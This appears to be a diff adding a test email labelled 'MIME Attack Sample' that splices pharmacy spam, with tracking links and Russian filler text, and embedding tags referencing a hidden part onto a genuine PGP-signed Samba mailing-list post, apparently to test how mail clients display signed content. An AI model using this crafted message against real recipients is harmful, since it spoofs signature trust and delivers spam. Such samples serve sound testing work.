@@ -1,0 +1,96 @@
+From: "Bill Kawalec" <billkawalec@yahoo.com>
+To: john.forney@enron.com, robert.badeer@enron.com, greg.wolfe@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/plain
+Content-Transfer-Encoding: 7bit
+
+ 
+
+
+
+------------D6FC7AC37013B78
+Content-Type: text/html
+Content-Transfer-Encoding: 7bit
+
+<HTML>
+<body bgcolor="#FFFFFF" link="#6F7AC8">
+<p><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>There is no need to exert yourself with silly doubts while you are in bed.</strong></font>
+<a href="http://edinminkertion.com/?IJEMEOVVFcRlhQUVh0RkFXVlBMH0dEVUFUQF9bWh9RUg=="><font color="#FFFFFF">Our site</font></a></p>
+<p><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Viagra, Cialis, Valium, Levitra and more medications<br>
+<a href="http://edinminkertion.com/?EILJSMVVFcRlhQUVh0RkFXVlBMH0dEVUFUQF9bWh9RUg=="><strong>Our pharmacy</strong></a></font></p>
+<p><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Fantastic low prices! Instant shipping directly from our warehouses!</font></p>
+<p><font size="2" face="Verdana, Arial, Helvetica, sans-serif">With best regards,<br>
+Andrew Shannon</font></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Ty ved sovsem ne znaesh menia. Kazhetsia, ona ego vse-taki razozlila. I Kvin. Nogi ee tonuli v krasno-zheltyh lepestkah plameni, a Golova upiralas v sverkaiushchij serebristyj nimb, sypliushchij na ee plechi Stalnye iskry. <br>
+Reshenie bylo samoubijstvennym, no drugogo on Ne videl. Leks rasterianno smotrel emu vsled, dazhe kogda tot uzhe skrylsia v rasseline. No teper, kak on iavstvenno, priamo-taki fizicheski Oshchutil eto vsej svoej mechenoj v mnogochislennyh shvatkah shkuroj, on vliapalsia. Golos korotyshki byl Napriazhen i gluh, budto chto-to meshalo emu govorit. <br>A chto tut udivitelnogo esli mne ot ustalosti ne hotelos Shevelitsia, to chto uzh govorit o chuzhom, zatrativshem stolko sil vo vremia Bitvy na ploshchadi zabroshennogo goroda. Vozmozhno, vremia zameny eshche ne nastupilo, i Ona mogla nachatsia v samyj neozhidannyj moment. Ty rabotaesh tolko po zakazu! vykriknul mechnik, sryvaias v isteriku. Po moim podschetam, dve Treti puti v tridcat kilometrov my uzhe odoleli, i minut desiat eshche mozhno Bylo vzdremnut. <br>
+Kto zh znal, chto zasfernik tak vzbryknet. Lish zhodikil po inercii proshlepal eshche paru shagov i, Spohvativshis, toroplivo vernulsia na mesto. Hotia by o teh Tumannyh videniiah, prostupivshih vo vremia popytki stiraniia pamiati. Posle razmolvki s Eleonoroj proshlo uzhe okolo goda, a ia vse Eshche ne mog zabyt. ejisuminyon VVFcRlhQUVh0RkFXVlBMH0dEVUFUQF9bWh9RUg==</font></p>
+<p>&nbsp;</p>
+</body>
+</html>
+
+
+------------D6FC7AC37013B78--
+
+
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+Folks,
+
+Couple of small changes to the bzr trees at http://www.samba.org/~jerry/bzr/
+
+(a) The SAMBA_3_0_26.bzr was actually mirroring the SAMBA_3_0_25
+    svn branch.  My fault.  I've rebuilt the mirror bzr tree
+    from scratch which means that you will have to rebranch and
+    merge any local changes.  Sorry.  Had to be done.
+
+(b) I've reworked the mirror scripts
+    (http://people.samba.org/bzr/jerry/slag/scripts/) to be
+    a little quicker and so the updates are pushed out
+    once per hour now.  I might be able to squeeze that down
+    to twice an hour if really necessary.  Probably no more
+    than that without using post-commit hooks in the svn
+    repo itself (which I don't really want to do).
+
+(c) A couple of bzr trees had missed some changes (SAMBA_4_0
+    & SAMBA_3_0_25).  I manually synced back into shape.
+
+(d) I'm posting new tarballs of the SAMBA_3_0 and SAMBA_4_0 bzr
+    tree so you don't have to branch pull or branch to get a
+    local copy.  See http://www.samba.org/samba/ftp/bzr.
+    More details on available SCM tools can be found at
+    http://wiki.samba.org/.
+
+
+
+cheers, jerry
+=====================================================================
+Samba                                    ------- http://www.samba.org
+Centeris                         -----------  http://www.centeris.com
+"What man is a man who does not make the world better?"      --Balian
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGRgl8IR7qMdg1EfYRAg66AKDqs3743v5TnhHx//GZo1IELhfgMACguMhf
+cMiJXBQ31goAH6vHbr/tLh4=
+=T+v4
+-----END PGP SIGNATURE-----
+
+
+--BOUNDARY--
+--DELIMITER--
